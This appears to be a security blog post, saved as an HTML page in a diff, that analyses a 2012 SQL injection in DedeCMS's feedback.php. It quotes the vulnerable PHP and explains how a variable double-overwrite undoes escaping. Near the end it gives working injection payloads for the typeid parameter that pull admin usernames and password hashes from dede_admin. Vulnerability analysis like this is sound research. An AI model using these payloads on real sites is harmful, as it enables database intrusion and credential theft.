@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+  <title>对最近dedecms注入的分析 | Blog of Secer</title>
+  <meta name="description" content="" />
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="MobileOptimized" content="320" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
+  <link rel="stylesheet" type="text/css" href="/css/style.css" />
+  <meta name="generator" content="Blog of Secer">
+
+  
+  
+  
+
+  
+</head>
+
+<!--
+<body class="post-template">
+-->
+<body class="home-template">
+<div id="perspective" class="perspective effect-movedown">
+  <div class="container">
+    <!-- wrapper -->
+    <div class="wrapper">
+
+      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
+    <div class="vertical">
+        <div class="site-head-content inner">
+             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
+            <h1 class="blog-title">Blog of Secer</h1>
+            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
+        </div>
+    </div>
+</header>
+
+      
+
+<main class="content" role="main">
+  <article class="post">
+    <span class="post-meta">
+      <time datetime="2012-11-10T02:37:58.000Z" itemprop="datePublished">
+          2012-11-10
+      </time>
+    
+    
+    | 
+    <a href='/tag/注入漏洞/'>注入漏洞</a>
+    
+    
+</span>
+    <h1 class="post-title">对最近dedecms注入的分析</h1>
+    <section class="post-content">
+      <p>那天<a href="http://www.wooyun.org/bugs/wooyun-2012-014076" target="_blank">乌云</a>上发了dedecms feed.back&#160; typeid的<a href="http://ha.cker.in/tag/注入漏洞" target="_blank">注入漏洞</a>，下午就被忽略然后修复了。作者没公布利用方法，然后第二天就有了这篇文章….     <br>该漏洞是cyg07在乌云提交的， 漏洞文件: plus\feedback.php。     <br>存在问题的代码:</p>  <p>…   <br>if($comtype == ‘comments’)    <br>&#160; {    <br>&#160; $arctitle = addslashes($title);    <br>&#160; if($msg!=’’)    <br>&#160; {//$typeid变量未做初始化    <br>&#160;&#160;&#160; $inquery = &quot;INSERT INTO <code>#@__feedback</code>(<code>aid</code>,<code>typeid</code>,<code>username</code>,<code>arctitle</code>,<code>ip</code>,<code>ischeck</code>,<code>dtime</code>, <code>mid</code>,<code>bad</code>,<code>good</code>,<code>ftype</code>,<code>face</code>,<code>msg</code>)    <br>&#160;&#160;&#160;&#160;&#160;&#160; VALUES (‘$aid’,’$typeid’,’$username’,’$arctitle’,’$ip’,’$ischeck’,’$dtime’, ‘{$cfg_ml-&gt;M_ID}’,’0’,’0’,’$feedbacktype’,’$face’,’$msg’); &quot;;    <br>&#160;&#160;&#160;&#160;&#160; echo $inquery;//调试，输出查询语句    <br>&#160;&#160;&#160; $rs = $dsql-&gt;ExecuteNoneQuery($inquery);    <br>&#160;&#160;&#160; if(!$rs)    <br>&#160;&#160;&#160; {    <br>&#160;&#160;&#160;&#160;&#160; ShowMsg(‘ 发表评论错误! ‘, ‘-1’);    <br>&#160;&#160;&#160;&#160;&#160; //echo $dsql-&gt;GetError();    <br>&#160;&#160;&#160;&#160;&#160; exit();    <br>&#160;&#160;&#160; }    <br>&#160; }    <br>&#160; }    <br>&#160; //引用回复    <br>&#160; elseif ($comtype == ‘reply’)    <br>&#160; {    <br>&#160; $row = $dsql-&gt;GetOne(&quot;SELECT <em> FROM <code>#@__feedback</code> WHERE id =’$fid’&quot;);    <br>&#160; $arctitle = $row[‘arctitle’];    <br>&#160; $aid =$row[‘aid’];    <br>&#160; $msg = $quotemsg.$msg;    <br>&#160; $msg = HtmlReplace($msg, 2);    <br>&#160; $inquery = &quot;INSERT INTO <code>#@__feedback</code>(<code>aid</code>,<code>typeid</code>,<code>username</code>,<code>arctitle</code>,<code>ip</code>,<code>ischeck</code>,<code>dtime</code>,<code>mid</code>,<code>bad</code>,<code>good</code>,<code>ftype</code>,<code>face</code>,<code>msg</code>)    <br>&#160;&#160;&#160;&#160;&#160; VALUES (‘$aid’,’$typeid’,’$username’,’$arctitle’,’$ip’,’$ischeck’,’$dtime’,’{$cfg_ml-&gt;M_ID}’,’0’,’0’,’$feedbacktype’,’$face’,’$msg’)&quot;;    <br>&#160; $dsql-&gt;ExecuteNoneQuery($inquery);    <br>}</em></p>  <p><a href="http://img.cker.in/dedecms_1057A/BS8JVDS2DT8HF1F38D2NQ.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="$BS8JVDS2DT8HF1F38[D2NQ" border="0" alt="$BS8JVDS2DT8HF1F38[D2NQ" src="http://img.cker.in/dedecms_1057A/BS8JVDS2DT8HF1F38D2NQ_thumb.jpg" width="1198" height="236"></a></p>  <p>&#160;</p><br><a id="more"></a><br><p>完整的输入语句，第二个参数 typeid可控。</p>  <pre>INSERT INTO <code>#@__feedback</code>(<code>aid</code>,<code>typeid</code>,<code>username</code>,<code>arctitle</code>,<code>ip</code>,<code>ischeck</code>,<code>dtime</code>, <code>mid</code>,<code>bad</code>,<code>good</code>,<code>ftype</code>,<code>face</code>,<code>msg</code>) VALUES (‘108’,’2’,’游客’,’paxmac’,’127.0.0.1’,’1’,’1351774092’, ‘0’,’0’,’0’,’feedback’,’0’,’nsfocus&amp;&amp;paxmac team’);</pre><br><br><p><a href="http://img.cker.in/dedecms_1057A/0AMDG9BIHJ_CG8FWH.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="0~A{MDG9}BIHJ_%`C)G8FWH" border="0" alt="0~A{MDG9}BIHJ_%`C)G8FWH" src="http://img.cker.in/dedecms_1057A/0AMDG9BIHJ_CG8FWH_thumb.jpg" width="595" height="85"></a></p><br>common.inc.php文件 会把所有的request进行处理。<br><br><pre>function _RunMagicQuotes(&amp;$svar)<br>{<br>  if(!get_magic_quotes_gpc())<br>  {<br>  if( is_array($svar) )<br>  {<br>    foreach($svar as $_k =&gt; $_v) $svar[$_k] = _RunMagicQuotes($_v);<br>  }<br>  else<br>  {<br>    if( strlen($svar)&gt;0 &amp;&amp; preg<em>match(‘#^(cfg</em>|GLOBALS|_GET|_POST|_COOKIE)#’,$svar) )<br>    {<br>    exit(‘Request var not allow!’);<br>    }<br>    $svar = addslashes($svar);<br>  }<br>  }<br>  return $svar;<br>}<br>…..<br>foreach(Array(‘_GET’,’_POST’,’_COOKIE’) as $_request)<br>  {<br>  foreach($$_request as $_k =&gt; $_v)<br>      {<br>        if($_k == ‘nvarname’) ${$_k} = $_v;<br>        else ${$_k} = _RunMagicQuotes($_v);<br>      }<br>  }<br>….</pre><br>从上面代码可以看到他对外来的提交进行了转义处理，但是在filter.ini.php文件中<br><br><pre>function _FilterAll($fk, &amp;$svar)<br>{<br>  global $cfg_notallowstr,$cfg_replacestr;<br>  if( is_array($svar) )<br>  {<br>  foreach($svar as $_k =&gt; $_v)<br>  {<br>    $svar[$_k] = _FilterAll($fk,$_v);<br>  }<br>  }<br>  else<br>  {<br>  if($cfg_notallowstr!=’’ &amp;&amp; preg_match(&quot;#&quot;.$cfg_notallowstr.&quot;#i&quot;, $svar))<br>  {<br>    ShowMsg(&quot; $fk has not allow words!&quot;,’-1’);<br>    exit();<br>  }<br>  if($cfg_replacestr!=’’)<br>  {<br>    $svar = preg_replace(‘/‘.$cfg_replacestr.’/i’, &quot;**&quot;, $svar);<br>  }<br>  }<br>  return $svar;<br>}<br><br>/<em> 对_GET,_POST,_COOKIE进行过滤 </em>/<br>foreach(Array(‘_GET’,’_POST’,’_COOKIE’) as $_request)<br>{<br>  foreach($$_request as $_k =&gt; $_v)<br>  {<br>  ${$_k} = _FilterAll($_k,$_v);<br>  }<br>}</pre><br><br><p>上面是处理敏感词的代码，但是又对变量进行了注册，导致了变量二次覆盖漏洞。其实这漏洞很早前就存在，之前的是因为对提交的变量只检查一维数组的key，可以被绕过从而创建不允许的系统配置变量，dedecms历来的修改都让人摸不着头脑，修补的都是表面的东西，实质导致漏洞问题的原因不做修改。从这次的补丁看来，他就只加了一句判断$typeid是否为数字，对于80sec的防注入代码2次被绕过还继续无视。<br>  <br>所以在GPC=OFF的时候，被转义的变量又会被重新覆盖而变成正常代码。<br><br>  <br>Eg: typeid=2\’ 经过覆盖 typeid=2’<br><br>  <br>研究过上次dedecms SQL注入的问题的同学肯定了解他的防注入机制。这里做下简单的分析。他对于\到\之间的内容作为可信任，不对其进行检查。所以我们只要把想利用的代码放在’ ‘内就能躲过检查。利用Mysql的一个语法，他的值@<code>’</code>为空,下面来构造漏洞exp:<br><br>  <br>typeid=123′,@<code>’</code>,0×11111,1111,1,1351739660, 0,0,0,0,0,(SELECT concat(uname,0x5f,pwd,0x5f) FROM dede_admin)),(108,’1111<br><br>  <br>我用tamper data提交此参数，</p>
+
+<p><a href="http://img.cker.in/dedecms_1057A/RO5_L62ML0SRS119GYPM.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="RO5(_L62(ML0SRS119G{YPM" border="0" alt="RO5(_L62(ML0SRS119G{YPM" src="http://img.cker.in/dedecms_1057A/RO5_L62ML0SRS119GYPM_thumb.jpg" width="905" height="604"></a></p>
+
+<p></p>
+
+<p></p>
+
+<p>其实这里也利用了一个小bug<a href="http://img.cker.in/dedecms_1057A/Z7VOR8ST4VAFUOMX0T.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="Z7VOR8ST4[{VAFUOM{$X`0T" border="0" alt="Z7VOR8ST4[{VAFUOM{$X`0T" src="http://img.cker.in/dedecms_1057A/Z7VOR8ST4VAFUOMX0T_thumb.jpg" width="617" height="451"></a></p>
+
+<p></p>
+
+<p>可以看到他的表结构，只有msg可以为null，但是利用代码中在username中用了null，这是非法的语句，单独插入是不会成功的，但是后面一句语句是成立的，insert (a,b) values (1,1)(2,2) (1,1,)非法 (2,2)符合条件的时候会成功同时插入2条语句。由于显示字符数量的问题，所以选择了msg字段作为输出。<a href="http://img.cker.in/dedecms_1057A/25BV51PEO90X8F4LN.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="25BV%5)]1}PEO90X)8F4L@N" border="0" alt="25BV%5)]1}PEO90X)8F4L@N" src="http://img.cker.in/dedecms_1057A/25BV51PEO90X8F4LN_thumb.jpg" width="1159" height="542"></a><br><br>  <br>补充 ：<code>aid</code>,<code>typeid</code>,<code>username</code>,<code>arctitle</code>,<code>ip</code>,<code>ischeck</code>,<code>dtime</code>, <code>mid</code>,<code>bad</code>,<code>good</code>,<code>ftype</code>,<code>face</code>,<code>msg</code>&#160; aid是文章的ID 所以直接用我的语句是不成功的,需要修改成自己的文章ID<br><br>  <br>typeid=123′,@<code>’</code>,0×11111,1111,1,1351739660, 0,0,0,0,0,(SELECT concat(uname,0x5f,pwd,0x5f) FROM <code>#@__admin</code>)),(评论文章ID,’1111 </p>
+
+<p>如 Tamper提交，（文章id=123）msg改为</p>
+
+<p>mcbang&amp;typeid=0’,’3’,’4’,’5’,’0’,’1351739660’,%20’0’,’0’,’0’,’0’,’0’,’aaaaaa’),(‘123’,’2’,@<code>&#39;</code>,’4’,’5’,’1’,’1351739660’,%20’0’,’0’,’0’,’0’,’0’,(SELECT concat(uname,0x5f,pwd,0x5f) from ‘@#__admin’)),(123,’2</p>
+    </section>
+    <footer class="post-footer">
+      <section class="author">
+    <h4>Secer</h4>
+    <p>记录互联网安全历程与个人成长经历</p>
+</section>
+      <section class="share">
+    <h4>Share this post</h4>
+    <a class="icon-sina-weibo" href="http://v.t.sina.com.cn/share/share.php?title=记录互联网安全历程与个人成长经历 ?url=http://ha.cker.in/930.seo/" target="_blank">
+        <span class="hidden">weibo</span>
+    </a>
+    <a class="icon-twitter" href="http://twitter.com/share?url=http://ha.cker.in/930.seo/"
+       onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <span class="hidden">Twitter</span>
+    </a>
+    <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://ha.cker.in/930.seo/"
+       onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <span class="hidden">Facebook</span>
+    </a>
+    <a class="icon-google-plus" href="https://plus.google.com/share?url=http://ha.cker.in/930.seo/"
+       onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+        <span class="hidden">Google+</span>
+    </a>
+</section>
+
+    </footer>
+  </article>
+  <nav class="pagination" role="pagination">
+    
+    <a class="newer-posts" href="/931.seo/">
+        ← 解决CentOS下yum不能使用的错误(thread.error  can't start new thread)
+    </a>
+    
+    <span class="icon-logo">•</span>
+    
+    <a class="older-posts" href="/929.seo/">
+        对Android最新fakesms漏洞的分析 →
+    </a>
+    
+</nav>
+
+  <div id="comment" class="comments-area">
+    <h4 class="title"><a href="#disqus_comments" name="disqus_comments">Comments</a></h4>
+    
+</div>
+
+</main>
+
+
+      
+<footer class="site-footer">
+  
+  <div class="inner">
+     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
+     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
+  </div>
+</footer>
+
+      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
+<script type="text/javascript" src="/js/index.js"></script>
+<script type="text/javascript" src="/js/menu.js"></script>
+
+
+
+
+
+  </div>
+</div>
+
+<nav  class="outer-nav top horizontal">
+
+          <a class="icon-home"  href="/"><span>Home</span></a>
+
+          <a class="icon-news"  href="/archives"><span>Archive</span></a>
+
+          <a class="icon-image"  href="/images"><span>Images</span></a>
+
+          <a class="icon-wiki"  href="/wiki/"><span>Wiki</span></a>
+
+          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>
+
+          <a class="icon-mail"  href="/about/"><span>Contact</span></a>
+
+</nav>
+
+</div>
+</body>
+</html>
